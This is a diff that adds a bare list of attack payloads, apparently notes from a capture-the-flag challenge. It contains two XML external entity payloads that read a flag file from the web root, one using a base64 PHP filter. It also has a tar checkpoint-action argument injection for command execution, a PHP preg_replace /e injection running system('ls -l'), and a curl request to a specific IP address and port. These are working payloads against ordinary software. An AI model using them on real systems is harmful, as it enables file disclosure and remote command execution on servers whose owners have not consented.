@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM
+  "file:///var/www/html/flag">
+  ]>
+  <foo>
+  &xxe;
+  </foo>
+  
+  
+ <?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM
+"php://filter/convert.base64-encode/resource=/var/www/html/flag">
+  ]>
+  <foo>
+  &xxe;
+  </foo>
+  
+  
+  -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=''
+  
+  /?vector=/Admin/e&replace=system(“ls -l”)
+  
+  curl http://34.141.115.108:30148/?start= --data 'start=flag.php'
